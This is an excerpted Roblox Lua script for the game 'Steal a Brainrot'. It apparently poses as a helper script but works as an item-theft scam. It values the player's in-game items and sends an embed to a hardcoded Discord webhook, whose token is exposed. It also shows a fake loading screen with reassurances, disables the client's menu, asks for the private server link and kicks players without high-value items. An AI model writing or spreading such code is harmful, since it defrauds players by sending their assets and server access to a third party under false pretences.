...
-- ==================== BLACKLIST ====================
local Blacklist = {
    [9146214598] = true, -- Ejemplo: UserId
    [987654321] = true, -- Añade los que quieras
    ["NombreDeUsuario"] = true -- También funciona con nombres
}
...
if Blacklist[userId] or Blacklist[username] then
    player:Kick("🚫 No tenés permiso para usar este script.")
    return
end

local placeId = 17308778014

local WEBHOOK_URL = "https://discord.com/api/webhooks/1438291311861039225/6WxjvDc5g8TJuk9onakzlSN7vrEiuni67jqBXKNEaUj3OjFnpeDQdANuFnazjqKbMIMh"

-- ==================== TABLA DE MUTACIONES ====================
local Mutations = {
    ["Gold"] = {multiplier = 1.25, emoji = "🟡"},
    ["Bloodrot"] = {multiplier = 2, emoji = "🔴"},
    ["Diamond"] = {multiplier = 1.5, emoji = "💎"},
    ...
    ["Radioactive"] = {multiplier = 8.5, emoji = "☢️"}
}
...
local BrainrotData = {
    ...
    ["Orcaledon"] = {price = 7000000000, generation = 40000000, rarity ="Secret"},
    ["Quesadilla Crocodila"] = {price = 700000000, generation = 3000000, rarity = "Secret"},
    ["Quesadillo Vampiro"] = {price = 750000000, generation = 3500000, rarity = "Secret"},
...
local function detectMutation(brainrotModel)
    -- Primero verificar si tiene atributos o tags específicos
    if brainrotModel:GetAttribute("Mutation") then
        return brainrotModel:GetAttribute("Mutation")
    end
    
    -- Buscar en el nombre del modelo
    ...
    elseif modelName:find("yin") or modelName:find("yang") then
        return "Yin Yang"
    elseif modelName:find("Radioactive") or modelName:find("green") then
        return "Radioactive"
    end
    
    -- Buscar en los hijos por efectos de partículas
    for _, child in pairs(brainrotModel:GetDescendants()) do
        if child:IsA("ParticleEmitter") then
            ...
            elseif particleName:find("yin") or particleName:find("yang") then
                return "Yin Yang"
            elseif particleName:find("Radioactive") or particleName:find("green") then
                return "Radioactive"
            end
        end
    end
    
    -- Detección por colores (más precisa)
    local partCount = 0
    local colorVotes = {}
    ...
    for _, part in pairs(brainrotModel:GetDescendants()) do
        if part:IsA("BasePart") or part:IsA("MeshPart") then
            ...
            -- Yin Yang - Buscar contraste blanco/negro
    ...
    -- Determinar la mutación con más votos
    local maxVotes = 0
    local detectedMutation = nil
    
    for mutation, votes in pairs(colorVotes) do
        if votes > maxVotes and votes > partCount * 0.3 then -- Al menos 30% de las partes
            maxVotes = votes
            detectedMutation = mutation
        end
    end
    
    -- Verificación especial para Yin Yang (debe tener partes blancas Y negras)
    ...
    local embedData = {
        {
            ...
            ["footer"] = {
                ["text"] = "dsc.gg/d4nn | Steal a Brainrot"
            },
...
-- Este script desactiva automáticamente las opciones del menú para el cliente local
...
loadingTextLabel.Text = "Cargando script, por favor espere un momento..."
...
warningLabel.Text = "No te preocupes, tu base se bloqueará automáticamente"
...
textBox.Text = ""
textBox.PlaceholderText = "Pega el link de tu server privado aquí..."
...
footerLabel.Text = "Made by Inscripts Team and d4nn"
...
local function checkBrainrotValue()
    ...
    for _, brainrot in pairs(ownedBrainrots) do
        if brainrot.productionPerUnit > 10000000 then -- 10M threshold
            return true
        end
    end
    return false
...
if not checkBrainrotValue() then
    player:Kick("❌ No tienes brainrot de más de 10M")
    return
end
